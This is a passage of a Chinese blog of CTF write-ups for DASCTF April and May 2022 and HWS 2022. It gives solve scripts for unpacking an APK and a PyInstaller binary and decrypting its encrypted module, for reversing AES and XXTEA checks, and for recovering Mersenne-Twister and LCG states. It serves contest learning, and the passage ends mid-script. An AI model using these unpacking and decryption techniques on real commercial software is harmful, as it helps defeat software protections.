BlackDex can run on any Android mobile phone or emulator, you can unpack APK File in several seconds. (github.com) 提取出脱壳文件，在拖进jadx中，进到MainActivity，大概逻辑就是对邮箱和密码进行AES/CBC加密，然后与content0和content1进行对比 然后写脚本可以得到解密后的邮箱和密码 1234567891011121314151617181920from Crypto.Cipher import AESfrom Crypto.Util.number import bytes_to_long,long_to_bytescontent0 = [-114, 95, -37, 127, -110, 113, 41, 74, 40, 73, 19, 124, -57, -88, 39, -116, -16, -75, -3, -45, -73, -6, -104, -6, -78, 121, 110, 74, -90, -47, -28, -28]content1 = [-40, 26, 95, -49, -40, -123, 72, -90, -100, -41, 122, -4, 25, -101, -58, 116]c0=b''for i in content0: c0+=long_to_bytes(i%256)c1=b''for i in content1: c1+=long_to_bytes(i%256)key=b'picapicapicapica'iv=b'0102030405060708'aes=AES.new(key,AES.MODE_CBC,iv)de_text_1=aes.decrypt(c0)print(de_text_1)aes2=AES.new(key,AES.MODE_CBC,iv)de_text_2=aes2.decrypt(c1)print(de_text_2)# picacomic@gmail.com# picacomic 最后登录进去即可getflag 奇怪的交易查到有upx壳，脱掉 拖进IDA，发现是python逆向，用pyinstxtractor+python反编译 - 在线工具 (tool.lu)尝试搞出源代码，发现大部分恢复失败 1objcopy --dump-section pydata=pydata.dump DAS 1python3 pyinstxtractor.py pydata.dump 翻译字节码dis模块得到字节码 1234567import marshalimport disf=open('aaa.pyc','rb')data=f.read()Pycode=data[16:]Pyobj=marshal.loads(Pycode)dis.dis(Pyobj) 大概翻译了一下： 12345678910111213141516171819202122from cup import *import libnumflag=input('请输入flag')pubkey=[12702192797044914024075774649965354105344232304099465264316470282606351700311177624703682814557100043599414982439635470829841890299241342602374578366076034128412992290094164613120745611751102797279925764448133764246126488845600641524814194290745105708735258127757986238766868988676022258542038318776640732920027324986285887310132372524224961045858183153047991881042129131551711617627844146600513830709959185824512201669420128585170924683844128155435146399996585220865423125338735154727569986267948480523307784641442521735105741341230032585576300299944879647981670048377150556292280650846158185797588466680532743801893,12680615221091469696163926483122992106481999501435284497098601343706982733487916553201934931961274845294041438909951977672521864927961654544622905443692482152403380984734291652023321187458458985625147422841102922314725726207365632256563373977251725785357590588556314671253970422319546403985257810950046085994573229162322957630767327089195523762665081311711474689269184996318744510300057603532953644164998953897411177604349567514705039306693117602798453972917348902600111420473965929048876821563646206875034926505783009957256212261250539005023918242209009676914632796839852778318989278092929214021282438144809708279435]m=libnum.s2n(flag)c=str(pow(m,pubkey[1],pubkey[0]))strange1=[]strange2=[3532577106, 1472742623, 3642468664, 4193500461, 2398676029, 617653972, 1474514999, 1471783658, 1012864704, 3615627536, 993855884, 438456717, 3358938551, 3906991208, 198959101, 3317190635, 3656923078, 613157871, 2398768861, 97286225, 2336972940, 1471645170, 3233163154, 583597118, 2863776301, 3183067750, 1384330715, 2929694742, 3522431804, 2181488067, 3303062236, 3825712422, 145643141, 2148976293, 2940910035, 506798154, 994590281, 2231904779, 3389770074, 2814269052, 1105937096, 1789727804, 3757028753, 2469686072, 1162286478, 680814033, 2934024098, 2162521262, 4048876895, 2121620700, 4240287315, 2391811140, 3396611602, 3091349617, 3031523010, 2486958601, 3164065171, 1285603712, 798920280, 2337813135, 4186055520, 3523024366, 1077514121, 1436444106, 2731983230, 1507202797, 500756149, 198754565, 2382448647, 880454148, 1970517398, 3217485349, 1161840191, 560498076, 1782600856, 2643721918, 1285196205, 788797746, 1195724574, 4061612551, 103427523, 2502688387, 4147162188, 617564657, 978211984, 1781482121, 2205798970, 3939973102, 3826603515, 659557668, 2582884932, 1561884856, 2217488804, 1189296962, 169145316, 2781742156, 1323893433, 824667876, 408202876, 3759637634, 4094868412, 1508996065, 162419237, 3732146944, 3083560189, 3955940127, 2393776934, 2470191468, 3620861513, 481927014, 2756226070, 3154651143, 1261069441, 2063238535, 2222237213, 101459755, 3159774417, 1721190841, 1078395785, 176506553, 3552913423, 1566142515, 1938949000, 1499289517, 3315102456, 829714860, 3843359394, 952932374, 1283577465, 2045007203, 3957761944, 3767891405, 2917089623, 3296133521, 482297421, 1734231412, 3670478932, 2575334979, 2827842737, 3413631016, 1533519803, 4008428470, 3890643173, 272960248, 317508587, 3299937500, 2440520601, 27470488, 1666674386, 1737927609, 750987808, 2385923471, 2694339191, 562925334, 2206035395]i=0while i&lt;len(c): strange3=0 for ii in c[i:i+4]: strange3=(strange3&lt;&lt;8)+ord(ii) strange1.append(strange3) i=i+4i&lt;len(c)strange4=[54,54,54,54]ᘠ=len(strange4)res=encrypt(ᘠ,strange1,strange4)if strange1==strange2: print('You are right!') 大致流程就是先进行一个RSA加密，然后是一个encrypt函数，这里的encrypt猜测从cup中import过来，因此下面需要对打包好的pyz进行逆向 pyinstaller加密这里实际上用了一个pyinstaller加密 解包pyz文件（注意这里需要在python3.10环境下才能解包成功） 然后注意从可执行文件解包回来的文件中，含有下面这个文件，其中含有加密的密钥，对其进行反编译可以得到 然后通过脚本对cup.pyc.encrypted进行解密，得到cup.pyc文件 123456789101112131415161718192021222324252627import tinyaesimport zlib CRYPT_BLOCK_SIZE = 16 # 从crypt_key.pyc获取key，也可自行反编译获取key = bytes('0000000000000tea', 'utf-8') inf = open('cup.pyc.encrypted', 'rb') # 打开加密文件outf = open('cup.pyc', 'wb') # 输出文件 # 按加密块大小进行读取iv = inf.read(CRYPT_BLOCK_SIZE) cipher = tinyaes.AES(key, iv) # 解密plaintext = zlib.decompress(cipher.CTR_xcrypt_buffer(inf.read()))# 补pyc头(最后自己补也行)outf.write(b'\\x6f\\x0d\\x0d\\x0a\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0')# 写入解密数据outf.write(plaintext) inf.close()outf.close() 最后看字节码可以分析出XXTEA加密（累 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576from ctypes import *def MX(z, y, total, key, p, e): temp1 = (z.value&gt;&gt;5 ^ y.value&lt;&lt;2) + (y.value&gt;&gt;3 ^ z.value&lt;&lt;4) temp2 = (total.value ^ y.value) + (key[(p&amp;3) ^ e.value] ^ z.value) return c_uint32(temp1 ^ temp2)def encrypt(n, v, key): delta = 0x9e3779b9 rounds = 6 + 52//n total = c_uint32(0) z = c_uint32(v[n-1]) e = c_uint32(0) while rounds &gt; 0: total.value += delta e.value = (total.value &gt;&gt; 2) &amp; 3 for p in range(n-1): y = c_uint32(v[p+1]) v[p] = c_uint32(v[p] + MX(z,y,total,key,p,e).value).value z.value = v[p] y = c_uint32(v[0]) v[n-1] = c_uint32(v[n-1] + MX(z,y,total,key,n-1,e).value).value z.value = v[n-1] rounds -= 1 return vdef decrypt(n, v, key): delta = 0x9E3779B9 rounds = 6 + 52//n total = c_uint32(rounds * delta) y = c_uint32(v[0]) e = c_uint32(0) while rounds &gt; 0: e.value = (total.value &gt;&gt; 2) &amp; 3 for p in range(n-1, 0, -1): z = c_uint32(v[p-1]) v[p] = c_uint32((v[p] - MX(z,y,total,key,p,e).value)).value y.value = v[p] z = c_uint32(v[n-1]) v[0] = c_uint32(v[0] - MX(z,y,total,key,0,e).value).value y.value = v[0] total.value -= delta rounds -= 1 return v # test if __name__ == &quot;__main__&quot;: # 该算法中每次可加密不只64bit的数据，并且加密的轮数由加密数据长度决定 k = [54, 54, 54, 54] n = 155 res=[3532577106, 1472742623, 3642468664, 4193500461, 2398676029, 617653972, 1474514999, 1471783658, 1012864704, 3615627536, 993855884, 438456717, 3358938551, 3906991208, 198959101, 3317190635, 3656923078, 613157871, 2398768861, 97286225, 2336972940, 1471645170, 3233163154, 583597118, 2863776301, 3183067750, 1384330715, 2929694742, 3522431804, 2181488067, 3303062236, 3825712422, 145643141, 2148976293, 2940910035, 506798154, 994590281, 2231904779, 3389770074, 2814269052, 1105937096, 1789727804, 3757028753, 2469686072, 1162286478, 680814033, 2934024098, 2162521262, 4048876895, 2121620700, 4240287315, 2391811140, 3396611602, 3091349617, 3031523010, 2486958601, 3164065171, 1285603712, 798920280, 2337813135, 4186055520, 3523024366, 1077514121, 1436444106, 2731983230, 1507202797, 500756149, 198754565, 2382448647, 880454148, 1970517398, 3217485349, 1161840191, 560498076, 1782600856, 2643721918, 1285196205, 788797746, 1195724574, 4061612551, 103427523, 2502688387, 4147162188, 617564657, 978211984, 1781482121, 2205798970, 3939973102, 3826603515, 659557668, 2582884932, 1561884856, 2217488804, 1189296962, 169145316, 2781742156, 1323893433, 824667876, 408202876, 3759637634, 4094868412, 1508996065, 162419237, 3732146944, 3083560189, 3955940127, 2393776934, 2470191468, 3620861513, 481927014, 2756226070, 3154651143, 1261069441, 2063238535, 2222237213, 101459755, 3159774417, 1721190841, 1078395785, 176506553, 3552913423, 1566142515, 1938949000, 1499289517, 3315102456, 829714860, 3843359394, 952932374, 1283577465, 2045007203, 3957761944, 3767891405, 2917089623, 3296133521, 482297421, 1734231412, 3670478932, 2575334979, 2827842737, 3413631016, 1533519803, 4008428470, 3890643173, 272960248, 317508587, 3299937500, 2440520601, 27470488, 1666674386, 1737927609, 750987808, 2385923471, 2694339191, 562925334, 2206035395] res = decrypt(n, res, k) # print(res) for i in res: print(chr(i&gt;&gt;24),end=&quot;&quot;) print(chr((i&amp;0x00ff0000)&gt;&gt;16),end=&quot;&quot;) print(chr((i&amp;0x0000ff00)&gt;&gt;8),end=&quot;&quot;) print(chr(i&amp;0x000000ff),end=&quot;&quot;) #c= 10610336534759505889607399322387179316771488492347274741918862678692508953185876570981227584004676580623553664818853686933004290078153620168054665086468417541382824708104480882577200529822968531743002301934310349005341104696887943182074473298650903541494918266823037984054778903666406545980557074219162536057146090758158128189406073809226361445046225524917089434897957301396534515964547462425719205819342172669899546965221084098690893672595962129879041507903210851706793788311452973769358455761907303633956322972510500253009083922781934406731633755418753858930476576720874219359466503538931371444470303193503733920039 最后通过RSA的维纳攻击即可恢复出flag 参考 DASCTF-FATE-Reverse | Hexo (gift1a.github.io) Re]2022DASCTF Apr X FATE 防疫挑战赛_批某人的博客-CSDN博客 DASCTF 2022 - 云之君 (yunzh1jun.com) https://ppppz.net/ _(:3」」还是被发现了 (t0hka.top) [原创]Python逆向——Pyinstaller逆向-软件逆向-看雪论坛-安全社区|安全招聘|bbs.pediy.com","link":"/2022/05/05/DASCTF-Apr-Writeup/"},{"title":"DASCTF MAY","text":"[TOC] CryptoYusa的密码学课堂—一见如故Description12345678910111213141516171819202122232425262728293031323334353637383940414243444546class Myrand(): def __init__(self,seed): self.index = 0 self.isInit = 1 self.MT = [seed] + [0] * 623 for i in range(1,624): t = 1314433253 * (self.MT[i-1] ^ (self.MT[i-1] &gt;&gt; 30)) + 1 self.MT[i] = t &amp; 0xffffffff def generate(self): for i in range(624): y = (self.MT[i] &amp; 0x80000000) + (self.MT[(i+1)%624] &amp; 0x7fffffff) self.MT[i] = self.MT[(i+397)%624] ^ (y &gt;&gt; 1) if y &amp; 1: self.MT[i] ^= 2567483520 def rand(self): if self.index == 0: self.generate() y = self.MT[self.index] y = y ^ self.cs2l(y, 11) ^ self.cs2l(y,15) y = y ^ self.cs2r(y,7) ^ self.cs2r(y,19) self.index = (self.index + 1) % 624 return y def cs2l(self, y, shift): return ((y &lt;&lt; shift) ^ (y &gt;&gt; (32 - shift))) &amp; 0xffffffff def cs2r(self, y, shift): return ((y &gt;&gt; shift) ^ (y &lt;&lt; (32 - shift))) &amp; 0xffffffffimport osr = Myrand(int(os.urandom(4).hex(),16))out = []for i in range(624): out.append(r.rand())with open(&quot;output.txt&quot;,&quot;w&quot;) as f: f.write(str(out))from hashlib import md5flag = 'DASCTF{' + md5(str(r.rand()).encode()).hexdigest() + '}'print(flag) 关键在于rand() y=MT[INDEX]\\\\ y=y\\oplus(y19)线性代数啥的不太懂，但试了一下可以发现 $Random$ 再经过随机数算法七次后即可还原回 $MT[INDEX]$ 既然能还原回 $MT[INDEX]$ ，那一切都好办了，再generate一次，运行一遍随机数生成算法即可 （较为正规的解法可以参考官方wp） solve123456789101112131415161718192021222324252627282930313233343536from hashlib import md5output=[3417500333, 4091726338, 652603332, 4187304543, 4293795290, 1622245003, 3383443782, 2420250331, 322010852, 1604005753, 3137930218, 1074571824, 1566336258, 2754341076, 1059426660, 2461569360, 613134153, 860561774, 3003069274, 553387944, 1949778231, 249886857, 2322866121, 3685855175, 1977923546, 1887238269, 253812990, 2188417674, 2718707711, 1599975569, 3254935456, 3199641169, 362166522, 1378687155, 912036995, 3174049018, 780042016, 970421905, 3468971406, 801660807, 833926127, 473587885, 158979812, 405306558, 1363084996, 2023076543, 2069797730, 718155249, 1641186127, 3616747747, 1575693921, 3856591855, 223881884, 3002184567, 1666647440, 617661934, 2673101022, 885332395, 3391329168, 1640225363, 2565685644, 3892963352, 3034627488, 2415435183, 3648712566, 2140877952, 1303506086, 2455662362, 1720382700, 3970268445, 2579167586, 4117229324, 846645263, 3252991293, 79067029, 2756800392, 2212447526, 2203329967, 1270408703, 740176928, 3176125705, 166800854, 3327343902, 2079714725, 3702269956, 3659849279, 3658666909, 797535816, 600857570, 553836307, 2394740468, 1178393549, 2183765310, 4014432190, 652246726, 3693235932, 4046942361, 4105444828, 145386213, 1198390220, 3023119098, 663559283, 225958361, 3893000878, 1615631644, 1941951859, 471085675, 2164362049, 4274234562, 4127314557, 1833529303, 17668093, 3208743142, 3210135945, 1772990736, 3290157875, 3006334453, 3831748800, 1120411838, 690279329, 2436940844, 1440602808, 1552272917, 1321728089, 524486126, 3696307959, 1189129368, 28736041, 3143264315, 3050323849, 1458456612, 389869312, 2360130428, 854837117, 1270423403, 3471650414, 243573262, 3449929772, 2436299611, 420972940, 923873821, 3499748829, 2470333529, 3901870125, 3589884387, 3339475693, 1526947412, 1747516667, 2971536797, 273910310, 2185887289, 2723697010, 1973585459, 1166325256, 1360822059, 416514510, 4038763765, 1816380840, 940152644, 3918708431, 3410593321, 3358844522, 3678637784, 2412834780, 3052967117, 3672611162, 570069042, 95771608, 1210821251, 2163778365, 2739972546, 3094346015, 749719666, 1697477587, 986142486, 2591897292, 1234948693, 3659791160, 3990257960, 501199958, 3029961497, 578415668, 124517322, 1985205894, 3777347400, 1149995545, 290699775, 3399696193, 1062094395, 2896523484, 1562688856, 992098141, 3941170280, 262596967, 2585751001, 3682611205, 530523926, 1202322766, 3777439514, 3051700271, 261632458, 2736123960, 2786338595, 86310784, 2760191516, 1344514731, 350767781, 2858876127, 519088864, 3193340756, 3563489312, 3239917298, 161418824, 470724403, 3310407387, 1743713887, 3064036770, 1175434157, 3029464330, 116086349, 1652489862, 1176236897, 4139800383, 3758499033, 2961626313, 3064683859, 958478146, 596650527, 1000277312, 4102368994, 1480011430, 4001401502, 4004287177, 3202905309, 1754655955, 2064262245, 1840530874, 2284428117, 2281854453, 1023839768, 2166517711, 2709857675, 2005014414, 4161461001, 2932436148, 2411599350, 4267437788, 2132764972, 150665266, 286170947, 2249288787, 3953585886, 1231725143, 2479045931, 2377059462, 281316188, 379113422, 920019004, 163289886, 2210874762, 1578529538, 309521495, 3737017316, 88919917, 559742618, 978230553, 2154491496, 994913727, 498894258, 1355546448, 4023836881, 3014313787, 164044564, 2408825840, 2029992558, 3707778216, 86206872, 3576935874, 185356787, 1774175910, 3145237900, 3497547609, 841914878, 3425254534, 4264030778, 2348022032, 178331591, 943923822, 3384367749, 2806712599, 1178535099, 1251085540, 2410015803, 1480595408, 2732607876, 1579706357, 870791724, 2320512780, 2149666862, 3797999384, 3905363134, 3388169321, 851973359, 1418716205, 207581030, 1740441523, 1173839013, 4280610104, 1769134281, 1758916333, 4061069248, 2147554262, 2749007447, 909878569, 2054562584, 1515003000, 560286390, 2482663802, 2690882951, 3298162668, 2561737261, 167825221, 507375343, 2179952491, 795452860, 2877704207, 3243106071, 1633372043, 2152178033, 2993246714, 4176238981, 3828458887, 695369535, 2514762808, 2251430819, 2743651063, 783239046, 4036497041, 2175424426, 765021321, 897227922, 3192938155, 4173350810, 2290496185, 4215986056, 2448481441, 3114984799, 2920066349, 722868808, 594363801, 4012575088, 454547939, 3331771662, 1267229957, 3170277692, 2446344734, 3730529788, 2621611481, 2972284304, 2580290241, 486727007, 2727955445, 1457071884, 1053028185, 462301682, 3907840756, 1832398102, 3144685297, 3403964915, 4263570498, 792776003, 306771255, 1633688240, 2159479271, 942060576, 1311531808, 3145754189, 4142271069, 2844524541, 4082439147, 2847276716, 1374436698, 2601522390, 529644524, 206090172, 3015114937, 4137169373, 2600331537, 344659140, 155319271, 1724932164, 3187877676, 4020168431, 711431575, 4123955169, 2539963709, 2764832709, 3897838285, 2521203644, 2059212822, 1129046005, 3277260664, 2739869189, 1955591901, 2661672178, 2926355273, 28176978, 706409211, 1432061304, 26517996, 3180196905, 2178525849, 607854674, 3953350517, 3532394548, 4175940932, 626671309, 1273934270, 3481828801, 22643989, 2104739013, 4183577772, 3932721637, 3075788222, 2814353001, 4120869721, 2045506903, 603494333, 335162960, 2069261279, 2278614835, 210140447, 2012566692, 2345710126, 70390387, 457247932, 2764651800, 652766919, 555253440, 864036913, 1720142260, 453262569, 1113437101, 2576419688, 144008475, 1786881829, 2455128823, 2884922345, 4251332234, 58949785, 4206002785, 3374754553, 2976162198, 546450687, 1268444784, 4132330381, 3404894280, 2421962142, 212361299, 2526283704, 1656118437, 1249336298, 305885855, 1090758249, 3752057640, 3508190692, 3637428, 105102422, 2247418237, 1873609555, 1206760240, 3761689119, 3151616638, 1711308858, 1261541178, 1843103377, 3158893523, 1226253110, 3337577909, 126612372, 2239219657, 1415387229, 3657507305, 3330696118, 2304219467, 3782535397, 2523926865, 173770442, 469421316, 4068724979, 567442650, 1996215573, 2071307093, 778899724, 3534102235, 1001138889, 2821812427, 591691317, 1265763678, 2241915660, 3220601768, 653090205, 2367897867, 1393909319, 2691817329, 3098049768, 117121403, 1255294678, 2272844919, 788255921, 2333869622, 4052660679, 2407095869, 2636108242, 2204717619, 1672726444, 2250826426, 258706466, 2295454699, 337308034, 3703973770, 3133498524, 22718827, 3096937679, 2039003308, 1519854757, 568184976, 1986854118, 2888207511, 822307630, 3829301724, 3198527490, 3073739663, 3043580445, 3458239370, 802145890, 376901460, 1251103099, 1143003993, 1280321148, 661386076, 3708710489, 2237151715, 3928104641, 2975550516, 1087492088, 1504028830, 61927086, 3858242888, 1916136658, 2328550074, 3032032377, 2193802260, 3311627503, 3196945045, 3396801792, 806210594, 2449941623, 2514744466, 3922130206, 3245757763, 3128328446, 2335833206, 3205660364, 3527402441, 2174241644, 1262568556, 2360103007, 2490217737, 1485100950, 3407260, 3005226942, 1355314866, 3154763465, 619881867, 2409963438, 2422269402, 205756019, 3300644241, 1157501775, 1229058028, 161050869, 969496287, 3385825249, 2557284067, 4236642714, 169094727, 2698326774, 1863176242, 3532885426, 3046403588, 3869207867, 496104150, 353604631, 1054882225, 152711981, 1362131890, 76912113, 3052177189, 3932252092, 3834713905, 2338378436, 44417325, 117723195, 1089433566, 4166617161, 2848021308, 2229619096, 319957702, 3661655667, 2809620731, 482011930, 3983483016, 82362287, 1518135562, 3490996143, 510129461, 1400609584, 2646113779, 732457215, 3735585198, 3451194227, 959269510, 244188667]print(len(output))def cs2l( y, shift): return ((y &lt;&lt; shift) ^ (y &gt;&gt; (32 - shift))) &amp; 0xffffffff def cs2r(y, shift): return ((y &gt;&gt; shift) ^ (y &lt;&lt; (32 - shift))) &amp; 0xffffffff# Recover MTMT=[]for i in range(623,-1,-1): t=output[i] for i1 in range(7): t=t^cs2r(t,7) ^cs2r(t,19) for i2 in range(7): t=(t^cs2l(t,11)^cs2l(t,15)) MT.append(t)MT=MT[::-1]# get the next random numberdef generate(): for i in range(624): y = (MT[i] &amp; 0x80000000) + (MT[(i+1)%624] &amp; 0x7fffffff) MT[i] = MT[(i+397)%624] ^ (y &gt;&gt; 1) if y &amp; 1: MT[i] ^= 2567483520generate()y = MT[0]y = y ^ cs2l(y, 11) ^ cs2l(y,15) y = y ^ cs2r(y,7) ^ cs2r(y,19) print(y)flag = 'DASCTF{' + md5(str(y).encode()).hexdigest() + '}'print(flag) Yusa的密码学课堂——二眼深情Description随机数生成算法与Crypto 1一样，不同之处在于要求仅能查询两次随机数的情况下，还原随机数的种子 Analyse我们要还原出seed，而seed一开始放在init_MT[0]中，而由init算法我们可以知道init_MT[0]生成了init_MT[1]，也就是说知道了init_MT[1]可以在还原init_MT[0] 而从init算法我们可以知道的另一个重要信息是，只要我知道一个init_MT[i]的具体数值，就可以还原出init_MT[j](i&lt;j&lt;624)的信息，甚至是还原整个init_MT（这点未尝试，但感觉可以） 从上面的分析可以知道，我们只要知道任意一个init_MT[i]的信息，即可还原回seed。 接下来的重点在于分析generate()算法，我们的关注点落在了这行代码上 对于i=227的generate_MT[i]，其在生成过程中与generate_MT[(i+397)%624]异或。而除了i=623之外，y中始终是包含着init_MT[i+1]的信息的。 仔细分析过后，我们可以得到如下的策略： 查询$RANDOM[i]\\ RANDOM[j],\\ i\\geq 227\\ j=i+397\\ mod\\ 624$ 通过第一题的还原算法得到 $generate_MT[i], generate_MT[j]$ 通过等式 $generate_MT[i]=generate_MT[j]\\oplus (y&gt;&gt;1)$ 来还原$y$ 然后由$y$ 还原$init_MT[i+1]$ 最后由$init_MT[i+1]$ 还原$seed$ 这其中由于丢失了一些信息以及为了推导顺利做的假设，如假设$y\\&amp;1=0$，使得最终的还原存在一定的概率，不过每秒爆个几百万次的暴力算法啥的咱都见怪不怪了，这个也就爆个十来次挺不错了。 Solve由于概率问题，需要试个大概十几次才能爆出flag，或许还有更优化的解决方法，但我太懒了，就这样好了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445import osimport gmpy2# check 227 AND 0see_227=3777403325see_0_ed=4069692166# secret=1085569210def cs2l( y, shift): return ((y &lt;&lt; shift) ^ (y &gt;&gt; (32 - shift))) &amp; 0xffffffff def cs2r(y, shift): return ((y &gt;&gt; shift) ^ (y &lt;&lt; (32 - shift))) &amp; 0xffffffffdef recover_MT(t): for i1 in range(7): t=t^cs2r(t,7) ^cs2r(t,19) for i2 in range(7): t=(t^cs2l(t,11)^cs2l(t,15)) return t# y=int(os.urandom(4).hex(),16)# t=y# y = y ^ cs2l(y, 11) ^ cs2l(y,15)# y = y ^ cs2r(y,7) ^ cs2r(y,19)# print(t==recover_MT(y))MT_227=recover_MT(see_227)MT_0_ed=recover_MT(see_0_ed)# GET MT_228 ASSUME y&amp;1==0，p=3/4y_227=(MT_227^MT_0_ed)&lt;&lt;1MT_228=y_227&amp;0x7fffffff #假设最高为为0，概率为1/2#GET MT_397MT_397=MT_228for i in range(169):#397-228=169 MT_397 = 2037740385 * ( MT_397 ^ (MT_397 &gt;&gt; 30)) + 1 MT_397 = MT_397 &amp; 0xffffffff#GET MT_1,MT1=(MT_0_ed^MT_397)&lt;&lt;1MT_1=(MT_0_ed^MT_397)&lt;&lt;1 #再次假设y&amp;1==0#GET MT_0-&gt;SEEDseed=(MT_1-1)*gmpy2.invert(2037740385,1&lt;&lt;32)%(1&lt;&lt;32)seed=seed^(seed&gt;&gt;30)print(seed)# assert seed==secretprint('end') DASCTF{0d9f7e89-833b-4571-90bb-ea106bac31b4} Yusa的密码学课堂——三行情书Description123import randomoutput=[random.getrandbits(32) &amp; 2037740385 for i in range(2000)]flag = 'DASCTF{'+hex(random.getrandbits(32*4))[2:] + '}' # DASCTF{3797****************************} 好短的题目，只有三行（可能这就是出题人的三行情书吧 Analyse在做题前，得先了解梅森旋转算法，python中默认的随机数生成算法为MT19937，也就是本题中采用的随机数生成算法 1234567891011121314151617181920212223242526272829def _int32(x): return int(0xFFFFFFFF &amp; x)class MT19937: # 根据seed初始化624的state def __init__(self, seed): self.mt = [0] * 624 self.mt[0] = seed self.mti = 0 for i in range(1, 624): self.mt[i] = _int32(1812433253 * (self.mt[i - 1] ^ self.mt[i - 1] &gt;&gt; 30) + i) # 提取伪随机数 def extract_number(self): if self.mti == 0: self.twist() y = self.mt[self.mti] y = y ^ y &gt;&gt; 11 y = y ^ y &lt;&lt; 7 &amp; 2636928640 y = y ^ y &lt;&lt; 15 &amp; 4022730752 y = y ^ y &gt;&gt; 18 self.mti = (self.mti + 1) % 624 return _int32(y) # 对状态进行旋转 def twist(self): for i in range(0, 624): y = _int32((self.mt[i] &amp; 0x80000000) + (self.mt[(i + 1) % 624] &amp; 0x7fffffff)) self.mt[i] = (y &gt;&gt; 1) ^ self.mt[(i + 397) % 624] ReverseWER看了wp后血压上来了，明明调到了flag，却因为大小端没弄好交错了flag(╯▔皿▔)╯ 不过题目里涉及的知识点还是要学学的 题目设计是通过windows的WER机制来隐藏控制流 12345678910111213141516class Test {public: Test() { atexit(OnExit); PVOID pvParameter = NULL; DWORD dwPingInterval = RECOVERY_DEFAULT_PING_INTERVAL; DWORD dwFlags = 0; HRESULT hRes = RegisterApplicationRecoveryCallback(ApplicationRecoverCallback, pvParameter, dwPingInterval, dwFlags); }};void OnExit(){ WerReportHang(GetForegroundWindow(), NULL); TriggerException();} 关于 WER - Win32 apps | Microsoft Docs Windows 错误报告 (WER) 是一种灵活的基于事件的反馈基础结构，旨在收集有关Windows可以检测、向 Microsoft 报告信息以及为用户提供任何可用解决方案的硬件和软件问题的相关信息。 然后在类初始化时注册一个ApplicationRecoverCallback回调，可以在main函数前完成 ApplicationRecoveryCallback callback function (Windows) | Microsoft Docs) 在onExit中调用WerReportHang并触发异常，使真正的逻辑执行 WerReportHang function (errorrep.h) - Win32 apps | Microsoft Docs 在ida的import界面中搜WER，能够搜到触发异常的WerReportHang import里搜ApplicationRecoverFinished，能够找到程序的真正逻辑，也就能得到flag了 就是一个简单的异或： 12345678a =[ 0x05, 0x03, 0x55, 0x05,0x04, 0x07, 0x5E, 0x54,0x05, 0x07, 0x50, 0x02,0x03, 0x53, 0x5F, 0x50,0x53, 0x50, 0x53, 0x05, 0x55, 0x00, 0x54, 0x55,0x57, 0x03, 0x05, 0x02,0x52, 0x50, 0x51, 0x53]f=''for i in a: f+=chr(i^102)print(f) Misc不懂PCB的厨师不是好黑客下载附件，010editor打开PCB，搜索DASCTF直接得到flag 参考： DASCTF｜2022DASCTF May出题人挑战赛官方Write (qq.com) 浅析MT19937伪随机数生成算法 - 安全客，安全资讯平台 (anquanke.com) 梅森旋转算法 - 维基百科，自由的百科全书 (wikipedia.org)","link":"/2022/05/27/DASCTF-MAY/"},{"title":"HWS2022硬件安全在线夏令营","text":"[toc] HWS-easyRSA线性移位寄存器，给出了几个状态，列出同余方程组解出seed即可 123456789101112import gmpy2from Crypto.Util.number import long_to_bytesp=31893593182018727625473530765941216190921866039118147474754069955393226712079257707838327486268599271803s2=25820280412859586557218124484272275594433027771091486422152141535682739897353623931875432576083022273940s3=24295465524789348024814588142969609603624462580932512051939198335014954252359986260009296537423802567677s4=14963686422550871447791815183480974143372785034397446416396172429864269108509521776424254168481536292904a=gmpy2.invert((s3-s2)*gmpy2.invert(s4-s3,p),p)b=(s3-a*s2)%passert (a*s2+b)%p==s3 and (a*s3+b)%p==s4seed=((s2-b)*gmpy2.invert(a,p))%pprint(long_to_bytes(seed))# flag{e4syRsa1snotdifficult5996642D0A7415EF} re1类似于xtea算法，将算法逆向即可 1234567891011121314151617181920212223242526272829303132333435363738from Crypto.Util.number import long_to_bytescipher=[ 0x47, 0x3B, 0xBD, 0x10, 0xF9, 0xE0, 0x55, 0x61, 0xC5, 0xEB, 0xF7, 0x6A, 0x5F, 0x43, 0x23, 0x8D, 0x05, 0x16, 0x09, 0x1A, 0xEF, 0x40, 0x3D, 0xD4, 0x67, 0x6A, 0xB1, 0xB4, 0xA9, 0x78, 0x35, 0x6B]key=[0x1234, 0x2345, 0x4567, 0x6789]# cip=[0x473bbd10,0xf9e05561,0xc5ebf76a,0x5f43238d,0x0516091a,0xef403dd4,0x676ab1b4,0xa978356b]cip=[0x10bd3b47,0x6155e0f9,0x6af7ebc5,0x8d23435f,0x1a091605,0xd43d40ef,0xb4b16a67,0x6b3578a9]magic_num=((-1640531527)*12)%(1&lt;&lt;32)for i in range(12): v11 = key[(magic_num &gt;&gt; 2) &amp; 3 ^ 1] v12 = (magic_num &gt;&gt; 2) &amp; 3 ^ 3 v13 = key[(magic_num &gt;&gt; 2) &amp; 3 ^ 2] v1 = key[(magic_num &gt;&gt; 2) &amp; 3] cip[7]-=((magic_num ^cip[0]) + (key[v12]^cip[6]) ) ^ ((((16 * cip[6]) ^ (cip[0] &gt;&gt; 3))+ ((cip[6] &gt;&gt; 5) ^ (4 * cip[0])))) cip[7]%=(1&lt;&lt;32) cip[6]-=(((magic_num ^ cip[7]) + (v13 ^ cip[5])) ^ (((16 * cip[5]) ^ (cip[7] &gt;&gt; 3)) + ((cip[5] &gt;&gt; 5) ^ (4 * cip[7])))) cip[6]%=(1&lt;&lt;32) cip[5]-= ((v11 ^ cip[4]) + (magic_num ^ cip[6])) ^ (((16 * cip[4]) ^ (cip[6] &gt;&gt; 3)) + ((cip[4] &gt;&gt; 5) ^ (4 * cip[6]))) cip[5]%=(1&lt;&lt;32) cip[4]-= ((magic_num ^ cip[5]) + (v1 ^ cip[3])) ^ (((16 * cip[3]) ^ (cip[5] &gt;&gt; 3))+ ((cip[3] &gt;&gt; 5) ^ (4 * cip[5]))) cip[4]%=(1&lt;&lt;32) cip[3]-= ((magic_num ^ cip[4]) + (key[v12] ^ cip[2])) ^ (((16 * cip[2]) ^ (cip[4] &gt;&gt; 3))+ ((cip[2] &gt;&gt; 5) ^ (4 * cip[4]))) cip[3]%=(1&lt;&lt;32) cip[2]-= ((magic_num ^ cip[3]) + (v13 ^ cip[1])) ^ (((16 * cip[1]) ^ (cip[3] &gt;&gt; 3))+ ((cip[1] &gt;&gt; 5) ^ (4 * cip[3]))) cip[2]%=(1&lt;&lt;32) cip[1]-= ((v11 ^ 